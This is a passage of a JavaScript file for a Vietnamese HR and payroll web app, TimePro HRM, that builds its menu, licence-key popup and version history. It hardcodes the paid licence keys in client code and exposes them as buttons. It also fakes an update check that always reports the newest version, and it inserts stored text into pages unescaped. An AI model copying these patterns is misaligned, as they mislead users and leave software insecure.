if (typeof CODE_VERSION === 'undefined') {
    var CODE_VERSION = '2.2.1'; // cập nhật version mới nhất

}

function renderMenu(active) {
    // Xóa menu cũ nếu có
    const oldMenu = document.querySelector('.navbar');
    if (oldMenu) oldMenu.remove();

    // Lấy tên cửa hàng
    const storeName = (localStorage.getItem('storeName') || '').trim();

    // Kiểm tra nếu chưa từng chọn phiên bản thủ công (không có appVersionManual)
    let appVersionManual = localStorage.getItem('appVersionManual');
    let appVersion = localStorage.getItem('appVersion') || 'Free';

    // Tự động gán phiên bản theo tên cửa hàng nếu chưa từng chọn thủ công
    if (!appVersionManual) {
        if (storeName.toLowerCase() === 'lepshop') {
            appVersion = 'Pro';
            localStorage.setItem('appVersion', 'Pro');
        } else if (storeName.toLowerCase() === "h'farm" || storeName.toLowerCase() === "hfarm") {
            appVersion = 'Business';
            localStorage.setItem('appVersion', 'Business');
        } else {
            appVersion = 'Free';
            localStorage.setItem('appVersion', 'Free');
        }
    }

    // Định nghĩa màu cho từng phiên bản
    const versionColors = {
        Free:   { menu: '#1976d2', label: '#1976d2' },
        Pro:    { menu: '#ec4899', label: '#ec4899' }, // hồng cánh sen
        Business: { menu: '#2e7d32', label: '#2e7d32' }
    };

    // Lấy màu menu do người dùng chọn (nếu có)
    let userMenuColor = localStorage.getItem('menuColor');
    // Lấy màu phiên bản do hệ thống chọn (menuVersionColor)
    let menuVersionColor = localStorage.getItem('menuVersionColor');

    // Nếu có menuVersionColor thì ưu tiên, nếu không thì dùng menuColor, nếu không thì mặc định theo phiên bản
    let menuColor, labelColor;
    if (menuVersionColor) {
        menuColor = menuVersionColor;
        labelColor = menuVersionColor;
    } else if (userMenuColor) {
        menuColor = userMenuColor;
        labelColor = userMenuColor;
    } else {
        menuColor = (versionColors[appVersion] || versionColors['Free']).menu;
        labelColor = (versionColors[appVersion] || versionColors['Free']).label;
    }

    // Lấy màu và font logo từ localStorage nếu có
    let logoColor = localStorage.getItem('menuLogoColor') || '#111';
    let logoFont = localStorage.getItem('menuLogoFont') || "'Times New Roman', serif";

    // Thêm font Pacifico vào head nếu chưa có
    if (!document.getElementById('font-pacifico-link')) {
        const link = document.createElement('link');
        link.id = 'font-pacifico-link';
        link.rel = 'stylesheet';
        link.href = 'https://fonts.googleapis.com/css?family=Pacifico&display=swap';
        document.head.appendChild(link);
    }

    // Luôn cập nhật lại style khi renderMenu (xóa style cũ nếu có)
    const oldStyle = document.getElementById('menu-style');
    if (oldStyle) oldStyle.remove();
    const style = document.createElement('style');
    style.id = 'menu-style';
    style.innerHTML = `
        .navbar {
            background: ${menuColor};
            color: #fff;
            padding: 0 32px;
            display: flex;
            align-items: center;
            min-height: 64px;
            gap: 0;
            box-shadow: 0 4px 16px #0001;
            border-bottom-left-radius: 18px;
            border-bottom-right-radius: 18px;
            position: relative;
            z-index: 10;
        }
        .navbar .navbar-logo {
            font-family: ${logoFont};
            font-size: 22px;
            font-weight: bold;
            letter-spacing: 1.2px;
            color: ${logoColor};
            margin-right: 32px;
            display: flex;
            align-items: center;
            gap: 10px;
            user-select: none;
            font-style: italic;
            transform: skew(-8deg,0deg);
            text-shadow: 0 2px 8px #0003;
        }
        .navbar .navbar-logo-icon {
            width: 32px;
            height: 32px;
            background: #fff3;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0;
            box-shadow: 0 2px 8px #0002;
            /* SVG sẽ fill toàn bộ */
        }
        .navbar .navbar-logo-icon svg {
            width: 22px;
            height: 22px;
            display: block;
        }
        .navbar .app-version-label {
            background: ${labelColor};
            font-size:13px;
            font-weight:600;
            color: #fff;
            border-radius:6px;
            padding:2px 8px;
            margin-left:8px;
            letter-spacing:1px;
            cursor:pointer;
            box-shadow: 0 2px 8px ${labelColor}33;
            border: 2px solid #fff5;
            transition: background 0.2s;
            display: inline-block;
            text-align: center;
        }
        .navbar .app-version-label:hover {
            filter: brightness(1.1);
        }
        .navbar .navbar-menu {
            display: flex;
            gap: 8px;
            flex: 1;
        }
        .navbar button {
            background: none;
            border: none;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            padding: 10px 20px;
            border-radius: 8px;
            transition: background 0.18s, color 0.18s, box-shadow 0.18s;
            font-weight: 500;
            letter-spacing: 0.5px;
            margin: 0 2px;
            position: relative;
        }
        .navbar button.active, .navbar button:hover {
            background: #fff;
            color: #1976d2;
            box-shadow: 0 2px 8px #1976d233;
        }
        .navbar .menu-export-btn {
            background: #43a047;
            color: #fff;
            border: none;
            font-size: 16px;
            cursor: pointer;
            padding: 10px 18px;
            border-radius: 8px;
            margin-left: 16px;
            transition: background 0.18s, color 0.18s, box-shadow 0.18s;
            font-weight: 500;
            letter-spacing: 0.5px;
            display: inline-block;
            box-shadow: 0 2px 8px #43a04733;
        }
        .navbar .menu-export-btn:hover {
            background: #388e3c;
            color: #fff;
        }
        .navbar .menu-import-btn {
            background: #ff9800;
            color: #fff;
            border: none;
            font-size: 16px;
            cursor: pointer;
            padding: 10px 18px;
            border-radius: 8px;
            margin-left: 10px;
            transition: background 0.18s, color 0.18s, box-shadow 0.18s;
            font-weight: 500;
            letter-spacing: 0.5px;
            display: inline-block;
            position: relative;
            overflow: hidden;
            box-shadow: 0 2px 8px #ff980033;
        }
        .navbar .menu-import-btn:hover {
            background: #fb8c00;
            color: #fff;
        }
        .navbar .menu-data-dropdown {
            position: relative;
            margin-left: 16px;
        }
        .navbar .menu-data-btn {
            background: #1565c0;
            color: #fff;
            border: none;
            font-size: 16px;
            cursor: pointer;
            padding: 10px 18px;
            border-radius: 8px;
            font-weight: 500;
            letter-spacing: 0.5px;
            display: flex;
            align-items: center;
            gap: 6px;
            transition: background 0.18s;
        }
        .navbar .menu-data-btn:hover,
        .navbar .menu-data-btn:focus {
            background: #1976d2;
        }
        .navbar .menu-data-list {
            display: none;
            position: absolute;
            top: 110%;
            right: 0;
            min-width: 180px;
            background: #fff;
            color: #1976d2;
            border-radius: 8px;
            box-shadow: 0 4px 16px #0002;
            z-index: 100;
            flex-direction: column;
            padding: 6px 0;
            animation: fadeInMenu 0.18s;
        }
        .navbar .menu-data-dropdown.open .menu-data-list {
            display: flex;
        }
        .navbar .menu-data-list button {
            background: none;
            border: none;
            color: #1976d2;
            font-size: 15px;
            text-align: left;
            width: 100%;
            padding: 10px 20px;
            border-radius: 0;
            margin: 0;
            transition: background 0.15s, color 0.15s;
            font-weight: 500;
        }
        .navbar .menu-data-list button:hover {
            background: #e3f2fd;
            color: #1565c0;
        }
        .navbar .menu-data-list .menu-import-btn {
            color: #ff9800;
        }
        .navbar .menu-data-list .menu-export-btn {
            color: #43a047;
        }
        .navbar .menu-data-list .menu-telegram-btn {
            color: #0088cc;
        }
        .navbar input[type="file"] {
            display: none;
        }
        @keyframes fadeInMenu {
            from { opacity: 0; transform: translateY(10px);}
            to { opacity: 1; transform: translateY(0);}
        }
        @media (max-width: 900px) {
            .navbar {
                flex-direction: column;
                align-items: flex-start;
                padding: 0 10px;
                min-height: unset;
            }
            .navbar .navbar-logo {
                margin: 10px 0 0 0;
            }
            .navbar .navbar-menu {
                flex-wrap: wrap;
                gap: 4px;
                margin-bottom: 8px;
            }
            .navbar .menu-export-btn, .navbar .menu-import-btn {
                margin-left: 0;
            }
            .navbar .menu-data-dropdown {
                margin-left: 0;
                margin-top: 8px;
            }
        }
        `;
    document.head.appendChild(style);

    // Tạo menu mới (hiển thị phiên bản như cũ, nằm cạnh TimePro HRM)
    const nav = document.createElement('div');
    nav.className = 'navbar';
    nav.innerHTML = `
        <div class="navbar-logo" style="position:relative;">
            <span class="navbar-logo-icon">
                <!-- SVG đồng hồ hiện đại -->
                <svg viewBox="0 0 32 32" fill="none">
                  <circle cx="16" cy="16" r="13" stroke="#1976d2" stroke-width="3" fill="#fff"/>
                  <circle cx="16" cy="16" r="11" stroke="#1976d2" stroke-width="1" fill="#fff"/>
                  <line x1="16" y1="16" x2="16" y2="8" stroke="#1976d2" stroke-width="2.2" stroke-linecap="round"/>
                  <line x1="16" y1="16" x2="23" y2="16" stroke="#ec4899" stroke-width="2" stroke-linecap="round"/>
                  <circle cx="16" cy="16" r="1.6" fill="#ec4899"/>
                </svg>
            </span>
            <span style="display:inline-block;transform:skew(8deg,0deg);color:${logoColor};font-family:${logoFont};">
                TimePro <span style="font-size:0.9em;letter-spacing:1px;">HRM</span>
                <span id="app-version-number" style="
                    position: absolute;
                    left: 85%;
                    top: -15px;
                    font-size: 11px;
                    color: #111;
                    font-weight: bold;
                    letter-spacing: 0.5px;
                    background: none;
                    padding: 0;
                    border: none;
                    z-index: 2;
                    cursor: pointer;
                    text-decoration: underline dotted;
                    "
                    title="Xem lịch sử phiên bản"
                >
                    V${CODE_VERSION}
                </span>
            </span>
            <span id="app-version-label" class="app-version-label" title="Nhấn để nhập Key" style="color:#111;">
                ${appVersion}
            </span>
        </div>
        <div class="navbar-menu">
            ${(() => {
                // Danh sách menu mặc định (bỏ setup khỏi menu chính)
                const defaultMenus = [
                    { id: 'index', label: 'Trang Chủ', href: 'index.html' },
                    { id: 'emp', label: 'Danh sách nhân viên', href: 'emp.html' },
                    // { id: 'setup', label: 'Thiết Lập', href: 'setup.html' }, // chuyển vào Cài Đặt
                    { id: 'att', label: 'Chấm công', href: 'att.html' },
                    { id: 'payroll', label: 'Bảng lương', href: 'payroll.html' },
                    { id: 'payroll_report', label: 'Lập BC Lương', href: 'payroll_report.html' }
                ];
                // Lấy cấu hình menu từ localStorage
                let menuConfig = [];
                try {
                    menuConfig = JSON.parse(localStorage.getItem('menuConfig') || '[]');
                } catch {}
                // Loại bỏ setup, work_schedule, about khỏi menuConfig nếu có
                menuConfig = menuConfig.filter(m => m.id !== 'setup' && m.id !== 'work_schedule' && m.id !== 'about');
                let menus = menuConfig.length ? menuConfig : defaultMenus.map(m => ({...m, visible: true}));
                // Đảm bảo luôn có đủ các menu mặc định (nếu thiếu do cập nhật)
                defaultMenus.forEach(def => {
                    if (!menus.some(m => m.id === def.id)) menus.push({...def, visible: true});
                });
                // Sắp xếp lại đúng thứ tự theo config
                menus = menus.filter(m => defaultMenus.some(d => d.id === m.id));
                // Render các menu visible
                let html = menus.filter(m => m.visible !== false).map(m =>
                    `<button onclick="location.href='${m.href}'"${active===m.id?' class="active"':''}>${m.label}</button>`
                ).join('');
                return html;
            })()}
        </div>
        <button onclick="showSupportBotPopup()" style="background:#fff; color:#1976d2; border:1px solid #1976d2; margin-left:8px; height:40px; display:flex; align-items:center;">🤖 Hỗ trợ</button>
        <div class="menu-data-dropdown" tabindex="0">
            <button type="button" class="menu-data-btn" onclick="toggleMenuDataDropdown(event)">
                🛠️ Tiện Ích
            </button>
            <div class="menu-data-list">
                <button onclick="exportAllData()" class="menu-export-btn"${active==='export'?' class="active"':''}>Xuất dữ liệu</button>
                <button type="button" class="menu-import-btn" onclick="handleMenuImportBtnClick()">Nhập dữ liệu</button>
                <input id="importDataInput" type="file" accept=".json" onchange="importAllData && importAllData(event)">
                <button type="button" class="menu-telegram-btn" onclick="sendAllDataToTelegramBot()">Gửi dữ liệu về Bot</button>
                <button type="button" class="menu-setting-btn" onclick="showMenuSettingPopup()" style="color:#1976d2;">⚙️ Cài đặt menu</button>
                <button type="button" class="menu-setup-btn" onclick="location.href='setup.html'" style="color:#1976d2;">🔧 Thiết Lập</button>
                <button type="button" class="menu-work-schedule-btn" onclick="location.href='work_schedule.html'" style="color:#1976d2;">📅 Lịch làm việc</button>
                <button type="button" class="menu-payroll-full-btn" onclick="location.href='payroll_full.html'" style="color:#1976d2;">📊 Bảng lương chi tiết</button>
                <button type="button" class="menu-payroll-payout-report-btn" onclick="location.href='payroll_payout_report.html'" style="color:#1976d2;">📑 Báo Cáo Chi Trả Lương</button>
                <button type="button" class="menu-about-btn" onclick="location.href='about-mksof.html'" style="color:#1976d2;">ℹ️ Giới thiệu</button>

            </div>
        </div>
    `;
    document.body.insertBefore(nav, document.body.firstChild);

    // Thêm popup nhập key nếu chưa có
    if (!document.getElementById('popup-key-overlay')) {
        const popupHtml = `
        <div id="popup-key-overlay" style="display:none; position:fixed; z-index:9999; left:0; top:0; width:100vw; height:100vh; background:#0007; align-items:center; justify-content:center;">
            <div id="popup-key-box" style="background:#fff; border-radius:12px; box-shadow:0 8px 32px #0003; padding:32px 28px 24px 28px; min-width:320px; max-width:90vw; display:flex; flex-direction:column; align-items:center; position:relative;">
                <div style="font-size:20px; font-weight:600; color:#1976d2; margin-bottom:18px; letter-spacing:1px;">Nhập Key nâng cấp phiên bản</div>
                <div style="display:flex; gap:8px; margin-bottom:14px;">
                    <button class="quick-key-btn" data-key="Free" style="background:#eee; color:#1976d2; border:none; border-radius:6px; padding:6px 14px; font-size:14px; font-weight:600; cursor:pointer;">Free</button>
                    <button class="quick-key-btn" data-key="22062002Pro" style="background:#eee; color:#1976d2; border:none; border-radius:6px; padding:6px 14px; font-size:14px; font-weight:600; cursor:pointer;">Pro</button>
                    <button class="quick-key-btn" data-key="22062002BUS" style="background:#eee; color:#1976d2; border:none; border-radius:6px; padding:6px 14px; font-size:14px; font-weight:600; cursor:pointer;">Business</button>
                </div>
                <input id="popup-key-input" type="text" placeholder="Nhập key..." style="width:100%; font-size:16px; padding:10px 12px; border-radius:6px; border:1px solid #1976d2; outline:none; margin-bottom:18px;" />
                <div style="display:flex; gap:12px; width:100%; justify-content:center;">
                    <button id="popup-key-ok" style="background:#1976d2; color:#fff; border:none; border-radius:6px; padding:8px 22px; font-size:15px; font-weight:600; cursor:pointer; transition:background 0.18s;">Xác nhận</button>
                    <button id="popup-key-cancel" style="background:#eee; color:#1976d2; border:none; border-radius:6px; padding:8px 22px; font-size:15px; font-weight:600; cursor:pointer; transition:background 0.18s;">Hủy</button>
                </div>
                <span id="popup-key-msg" style="color:#d32f2f; font-size:13px; margin-top:10px; display:none;"></span>
                <span id="popup-key-close" style="position:absolute; top:8px; right:12px; font-size:20px; color:#888; cursor:pointer;" title="Đóng">&times;</span>
            </div>
        </div>
        <div id="popup-success-overlay" style="display:none; position:fixed; z-index:10000; left:0; top:0; width:100vw; height:100vh; background:#0005; align-items:center; justify-content:center;">
            <div id="popup-success-box" style="background:#fff; border-radius:12px; box-shadow:0 8px 32px #0003; padding:28px 32px 22px 32px; min-width:280px; max-width:90vw; display:flex; flex-direction:column; align-items:center; position:relative;">
                <div style="font-size:22px; color:#43a047; margin-bottom:12px;">&#10003;</div>
                <div id="popup-success-msg" style="font-size:17px; color:#1976d2; font-weight:600; text-align:center; margin-bottom:10px;"></div>
                <button id="popup-success-ok" style="background:#1976d2; color:#fff; border:none; border-radius:6px; padding:7px 22px; font-size:15px; font-weight:600; cursor:pointer; transition:background 0.18s;">Đóng</button>
                <span id="popup-success-close" style="position:absolute; top:8px; right:12px; font-size:20px; color:#888; cursor:pointer;" title="Đóng">&times;</span>
            </div>
        </div>
        <div id="popup-version-history-overlay" style="display:none; position:fixed; z-index:10001; left:0; top:0; width:100vw; height:100vh; background:#0007; align-items:center; justify-content:center;">
            <div id="popup-version-history-box" style="background:#fff; border-radius:12px; box-shadow:0 8px 32px #0003; padding:28px 32px 22px 32px; min-width:320px; max-width:95vw; display:flex; flex-direction:column; align-items:center; position:relative;">
                <div style="font-size:20px; font-weight:600; color:#1976d2; margin-bottom:18px; letter-spacing:1px;">Lịch sử các phiên bản</div>
                <div id="popup-version-history-content" style="width:100%; max-height:55vh; overflow-y:auto; font-size:15px; color:#333; text-align:left;">
                    <!-- Nội dung lịch sử sẽ được render ở đây -->
                </div>
                <button id="popup-version-history-ok" style="background:#1976d2; color:#fff; border:none; border-radius:6px; padding:7px 22px; font-size:15px; font-weight:600; cursor:pointer; margin-top:18px; transition:background 0.18s;">Đóng</button>
                <span id="popup-version-history-close" style="position:absolute; top:8px; right:12px; font-size:20px; color:#888; cursor:pointer;" title="Đóng">&times;</span>
            </div>
        </div>
        `;
        const div = document.createElement('div');
        div.innerHTML = popupHtml;
        // Sửa lỗi: dùng firstChild thay vì firstElementChild để tránh lỗi null
        while (div.firstChild) {
            try {
                document.body.appendChild(div.firstChild);
            } catch (e) {
                // Ép ẩn lỗi nếu body chưa sẵn sàng hoặc có lỗi bất ngờ
                break;
            }
        }
    }


    // Hàm ghi log thao tác (ghi lại mọi thao tác, chỉ lưu local, không gửi bot)
    window.addHistoryLog = function(action, detail) {
        const logs = JSON.parse(localStorage.getItem('historyLogs') || '[]');
        const user = localStorage.getItem('currentUser') || 'Ẩn danh';
        logs.unshift({
            time: new Date().toLocaleString(),
            user,
            action,
            detail
        });
        // Giới hạn tối đa 2000 dòng log
        if (logs.length > 2000) logs.length = 2000;
        localStorage.setItem('historyLogs', JSON.stringify(logs));
    };

    // Ghi lại thao tác vào phần mềm (vào phần mềm, chuyển tab, mở popup, chấm công, xuất/nhập dữ liệu, v.v.)
    (function setupAutoHistoryLog() {
        // Ghi lại lần đầu vào phần mềm
        if (!sessionStorage.getItem('loggedThisSession')) {
            window.addHistoryLog('Đăng nhập/Truy cập', 'Vào phần mềm lúc ' + new Date().toLocaleString());
            sessionStorage.setItem('loggedThisSession', '1');
        }
        // Ghi lại chuyển tab menu
        document.addEventListener('click', function(e) {
            const btn = e.target.closest('.navbar-menu button');
            if (btn) {
                window.addHistoryLog('Chuyển tab', btn.textContent.trim());
            }
        }, true);
        // Ghi lại mở popup lịch sử phiên bản
        document.addEventListener('click', function(e) {
            if (e.target && e.target.id === 'app-version-number') {
                window.addHistoryLog('Xem lịch sử phiên bản', '');
            }
        }, true);
        // Ghi lại mở popup nhập key
        document.addEventListener('click', function(e) {
            if (e.target && e.target.id === 'app-version-label') {
                window.addHistoryLog('Mở popup nhập key', '');
            }
        }, true);
        // Ghi lại mở popup lịch sử thao tác
        document.addEventListener('click', function(e) {
            if (e.target && e.target.classList.contains('menu-history-btn')) {
                window.addHistoryLog('Xem lịch sử thao tác', '');
            }
        }, true);
        // Ghi lại xuất dữ liệu
        window.exportAllData = (function(orig) {
            return function() {
                window.addHistoryLog('Xuất dữ liệu', 'Xuất toàn bộ dữ liệu ra file');
                if (orig) orig.apply(this, arguments);
            };
        })(window.exportAllData);
        // Ghi lại nhập dữ liệu
        window.importAllData = (function(orig) {
            return function() {
                window.addHistoryLog('Nhập dữ liệu', 'Nhập dữ liệu từ file');
                if (orig) orig.apply(this, arguments);
            };
        })(window.importAllData);
        // Ghi lại gửi dữ liệu về bot
        window.sendAllDataToTelegramBot = (function(orig) {
            return function() {
                window.addHistoryLog('Gửi dữ liệu về Bot', '');
                if (orig) orig.apply(this, arguments);
            };
        })(window.sendAllDataToTelegramBot);
        // Ghi lại mở các popup khác nếu muốn...
    })();

    // Hàm hiển thị popup lịch sử thao tác
    window.showHistoryLogPopup = function() {
        const overlay = document.getElementById('popup-history-log-overlay');
        const content = document.getElementById('popup-history-log-content');
        const logs = JSON.parse(localStorage.getItem('historyLogs') || '[]');
        if (logs.length === 0) {
            content.innerHTML = '<div style="color:#888; text-align:center; padding:24px 0;">Chưa có lịch sử thao tác nào.</div>';
        } else {
            content.innerHTML = logs.map(log =>
                `<div style="padding:7px 18px; border-bottom:1px solid #e3eaf2;">
                    <div style="font-size:13px; color:#1976d2; font-weight:600;">${log.time} - ${log.user}</div>
                    <div style="margin-left:8px; margin-top:2px;"><b>${log.action}</b> ${log.detail ? ('- ' + log.detail) : ''}</div>
                </div>`
            ).join('');
        }
        overlay.style.display = 'flex';
        document.getElementById('popup-history-log-ok').onclick = function() {
            overlay.style.display = 'none';
        };
        document.getElementById('popup-history-log-close').onclick = function() {
            overlay.style.display = 'none';
        };
        overlay.onkeydown = function(e) {
            if (e.key === 'Escape') overlay.style.display = 'none';
        };
        setTimeout(() => {
            document.getElementById('popup-history-log-ok').focus();
        }, 100);
    };

    // Hàm mở popup thông báo thành công
    function showSuccessPopup(msg) {
        const overlay = document.getElementById('popup-success-overlay');
        const msgDiv = document.getElementById('popup-success-msg');
        // Sửa lỗi: Nếu overlay hoặc msgDiv chưa tồn tại, không làm gì
        if (!overlay || !msgDiv) return;
        msgDiv.textContent = msg;
        overlay.style.display = 'flex';
        document.getElementById('popup-success-ok').onclick = function() {
            overlay.style.display = 'none';
        };
        document.getElementById('popup-success-close').onclick = function() {
            overlay.style.display = 'none';
        };
        overlay.onkeydown = function(e) {
            if (e.key === 'Escape') overlay.style.display = 'none';
        };
        setTimeout(() => {
            const okBtn = document.getElementById('popup-success-ok');
            if (okBtn) okBtn.focus();
        }, 100);
    }

    // Hàm mở popup nhập key
    function showKeyPopup() {
        const overlay = document.getElementById('popup-key-overlay');
        const input = document.getElementById('popup-key-input');
        const msg = document.getElementById('popup-key-msg');
        overlay.style.display = 'flex';
        input.value = '';
        msg.style.display = 'none';
        msg.textContent = '';
        input.focus();

        // Xác nhận key
        document.getElementById('popup-key-ok').onclick = function() {
            const key = input.value.trim();
            if (!key) {
                msg.textContent = 'Vui lòng nhập key!';
                msg.style.display = 'block';
                input.focus();
                return;
            }
            function setVersion(version, msgText) {
                localStorage.setItem('appVersion', version);
                localStorage.setItem('appVersionManual', '1');
                // Đổi màu menu theo phiên bản ngay lập tức
                localStorage.setItem('menuVersionColor', versionColors[version].menu);
                // Khi chọn phiên bản, bỏ chọn màu thủ công (menuColor) để ưu tiên màu phiên bản
                localStorage.removeItem('menuColor');
                overlay.style.display = 'none';
                showSuccessPopup(msgText);
                // Tự động F5 lại trang sau khi chọn phiên bản
                setTimeout(() => {
                    location.reload();
                }, 600);
            }
            if (key === '22062002Pro') {
                setVersion('Pro', 'Đã nâng cấp lên phiên bản Pro!');
            } else if (key === '22062002BUS') {
                setVersion('Business', 'Đã nâng cấp lên phiên bản Business!');
            } else if (key === 'Free') {
                setVersion('Free', 'Đã chuyển về phiên bản Free!');
            } else {
                msg.textContent = 'Key không hợp lệ!';
                msg.style.display = 'block';
                input.focus();
            }
        };
        // Hủy
        document.getElementById('popup-key-cancel').onclick = function() {
            overlay.style.display = 'none';
        };
        // Đóng bằng dấu X
        document.getElementById('popup-key-close').onclick = function() {
            overlay.style.display = 'none';
        };
        // Đóng bằng phím ESC
        overlay.onkeydown = function(e) {
            if (e.key === 'Escape') overlay.style.display = 'none';
        };
        // Cho phép Enter để xác nhận
        input.onkeydown = function(e) {
            if (e.key === 'Enter') document.getElementById('popup-key-ok').click();
        };
        // Thêm sự kiện cho các nút key mẫu
        overlay.querySelectorAll('.quick-key-btn').forEach(btn => {
            btn.onclick = function() {
                input.value = btn.getAttribute('data-key');
                document.getElementById('popup-key-ok').click();
            };
        });
    }

    // Thêm hàm hiển thị popup lịch sử phiên bản
    function showVersionHistoryPopup() {
        const overlay = document.getElementById('popup-version-history-overlay');
        const content = document.getElementById('popup-version-history-content');
        // Danh sách lịch sử phiên bản (từ 1.0.0 đến 2.2.0, mỗi bản một cải tiến)
        const history = [
            {
                version: '2.2.1',
                date: '28/6/2025',
                note: 'Khắc phục sự cố nghiêm trọng về lập trình có nguy cơ ảnh hưởng toàn hệ thống.<br>- Cập nhật thông tin ngân hàng nhân viên / VietQR.<br>- Vá lỗi hệ thống và nâng cấp báo cáo lương chi tiết.'
            },
            {
                version: '2.2.0',
                date: '25/6/2025',
                note: 'Thêm chức năng thiết lập ngày lễ: Cho phép người dùng thêm, sửa, xóa các ngày lễ để tự động tính công và lương ngày lễ.'
            },
            {
                version: '2.1.0',
                date: '22/6/2025',
                note: 'Nâng cấp lớn: Thêm cập nhật hệ số công với hình thức lương cơ bản, bổ sung biểu đồ cơ cấu nhân sự, cải tiến giao diện phần mềm.'
            },
            {
                version: '2.0.3',
                date: '20/6/2025',
                note: 'Vá lỗi hệ thống, cập nhật bảo mật, cập nhật giao diện. Thêm tính năng chat box hỗ trợ tự động.'
            },
            {
                version: '2.0.2',
                date: '19/6/2025',
                note: 'Cập nhật tính doanh thu cho nhân viên lương cơ bản.'
            },
            {
                version: '2.0.1',
                date: '18/6/2025',
                note: 'Cập nhật bản vá: Sửa lỗi nhỏ và tối ưu hiệu năng giao diện.'
            },
            {
                version: '2.0.0',
                date: '15/6/2025',
                note: 'Nâng cấp lên V2: Thêm tính năng Chấm Công Bằng Mã QR và tinh chỉnh danh sách nhân viên đa năng.'
            },
            {
                version: '1.1.5',
                date: '10/6/2025',
                note: 'Thêm popup lịch sử phiên bản khi nhấn vào số version.'
            },
            {
                version: '1.1.4',
                date: '5/6/2025',
                note: 'Cải thiện tốc độ xuất dữ liệu và sửa lỗi nhỏ giao diện.'
            },
            {
                version: '1.1.3',
                date: '30/5/2025',
                note: 'Thêm chức năng gửi dữ liệu về Telegram Bot.'
            },
            {
                version: '1.1.2',
                date: '25/5/2025',
                note: 'Bổ sung xuất lịch làm việc và ca mẫu lịch làm việc vào dữ liệu xuất file.'
            },
            {
                version: '1.1.1',
                date: '20/5/2025',
                note: 'Tối ưu popup nhập key và giao diện menu.'
            },
            {
                version: '1.1.0',
                date: '15/5/2025',
                note: 'Thêm popup nhập key nâng cấp phiên bản (Free/Pro/Business).'
            },
            {
                version: '1.0.9',
                date: '10/5/2025',
                note: 'Thêm chức năng nhập/xuất toàn bộ dữ liệu (JSON).'
            },
            {
                version: '1.0.8',
                date: '7/5/2025',
                note: 'Thêm chức năng ghi chú cá nhân cho từng nhân viên.'
            },
            {
                version: '1.0.7',
                date: '5/5/2025',
                note: 'Thêm chức năng lập báo cáo lương tổng hợp theo tháng.'
            },
            {
                version: '1.0.6',
                date: '3/5/2025',
                note: 'Thêm chức năng bảng lương chi tiết từng nhân viên.'
            },
            {
                version: '1.0.5',
                date: '2/5/2025',
                note: 'Thêm chức năng chấm công theo ca và lịch làm việc.'
            },
            {
                version: '1.0.4',
                date: '1/5/2025',
                note: 'Thêm chức năng thiết lập ca làm việc và lịch làm việc tuần.'
            },
            {
                version: '1.0.3',
                date: '30/4/2025',
                note: 'Thêm chức năng quản lý danh sách nhân viên.'
            },
            {
                version: '1.0.2',
                date: '28/4/2025',
                note: 'Thêm giao diện menu mới và tối ưu trải nghiệm người dùng.'
            },
            {
                version: '1.0.1',
                date: '25/4/2025',
                note: 'Thêm chức năng đăng nhập và phân quyền cơ bản.'
            },
            {
                version: '1.0.0',
                date: '20/4/2025',
                note: 'Ra mắt phiên bản đầu tiên với các chức năng cơ bản: chấm công, xem danh sách nhân viên, xuất dữ liệu.'
            }
        ];
        // Lấy version hiện tại
        let currentVersion = CODE_VERSION;
        content.innerHTML = history.map(h =>
            `<div style="margin-bottom:12px;">
                <b style="color:#1976d2;">V${h.version}</b>
                <span style="color:#888; font-size:13px; margin-left:8px;">(${h.date})</span>
                <div style="margin-left:12px; margin-top:2px;">- ${h.note}</div>
                ${h.version === currentVersion ? `<span style="margin-left:12px; color:#43a047; font-size:13px;">(Đang dùng)</span>` : ''}
            </div>`
        ).join('') +
        `<div style="margin-top:18px; text-align:center;">
            <button id="btn-check-update" style="background:#1976d2; color:#fff; border:none; border-radius:6px; padding:7px 22px; font-size:15px; font-weight:600; cursor:pointer; transition:background 0.18s;">
                Kiểm tra cập nhật
            </button>
            <span id="check-update-msg" style="display:inline-block; margin-left:12px; color:#1976d2; font-size:14px;"></span>
        </div>`;
        overlay.style.display = 'flex';

        // Sự kiện kiểm tra cập nhật: luôn báo đã dùng bản mới nhất
        document.getElementById('btn-check-update').onclick = function() {
            const msg = document.getElementById('check-update-msg');
            msg.textContent = 'Đang kiểm tra...';
            setTimeout(() => {
                msg.textContent = 'Bạn đang dùng phiên bản mới nhất!';
            }, 900);
        };

        document.getElementById('popup-version-history-ok').onclick = function() {
            overlay.style.display = 'none';
        };
        document.getElementById('popup-version-history-close').onclick = function() {
            overlay.style.display = 'none';
        };
        overlay.onkeydown = function(e) {
            if (e.key === 'Escape') overlay.style.display = 'none';
        };
        setTimeout(() => {
            document.getElementById('popup-version-history-ok').focus();
        }, 100);
    }



    // Thêm popup cài đặt menu nếu chưa có
    if (!document.getElementById('popup-menu-setting-overlay')) {
        const popupMenuSettingHtml = `
        <div id="popup-menu-setting-overlay" style="display:none; position:fixed; z-index:10010; left:0; top:0; width:100vw; height:100vh; background:#0007; align-items:center; justify-content:center;">
            <div id="popup-menu-setting-box" style="background:#fff; border-radius:12px; box-shadow:0 8px 32px #0003; padding:28px 24px 22px 24px; min-width:340px; max-width:95vw; display:flex; flex-direction:column; align-items:center; position:relative;">
                <div style="font-size:18px; font-weight:600; color:#1976d2; margin-bottom:12px;">Cài đặt menu</div>
                <div id="menu-setting-list" style="width:100%; max-height:50vh; overflow-y:auto; margin-bottom:16px;">
                    <!-- Danh sách menu sẽ render ở đây -->
                </div>
                <div id="logo-setting-area" style="width:100%;margin-bottom:16px;">
                    <div style="font-size:15px;color:#1976d2;font-weight:600;margin-bottom:6px;">Tùy chỉnh Logo</div>
                    <div style="display:flex;align-items:center;gap:18px;">
                        <label style="display:flex;align-items:center;gap:6px;">
                            <span>Màu chữ:</span>
                            <input type="color" id="menu-logo-color-input" value="#111" style="width:32px;height:32px;border:none;background:none;cursor:pointer;">
                        </label>
                        <label style="display:flex;align-items:center;gap:6px;">
                            <span>Font:</span>
                            <select id="menu-logo-font-input" style="padding:4px 8px;border-radius:5px;">
                                <option value="'Pacifico', cursive">Pacifico</option>
                                <option value="'Arial', sans-serif">Arial</option>
                                <option value="'Times New Roman', serif">Times New Roman</option>
                                <option value="'Roboto', sans-serif">Roboto</option>
                                <option value="'Tahoma', sans-serif">Tahoma</option>
                                <option value="'Courier New', monospace">Courier New</option>
                                <option value="'Comic Sans MS', cursive">Comic Sans MS</option>
                            </select>
                        </label>
                        <button id="menu-logo-reset-btn" type="button" style="margin-left:10px;padding:5px 12px;border-radius:6px;border:1px solid #1976d2;background:#fff;color:#1976d2;cursor:pointer;font-size:14px;">Về mặc định</button>
                    </div>
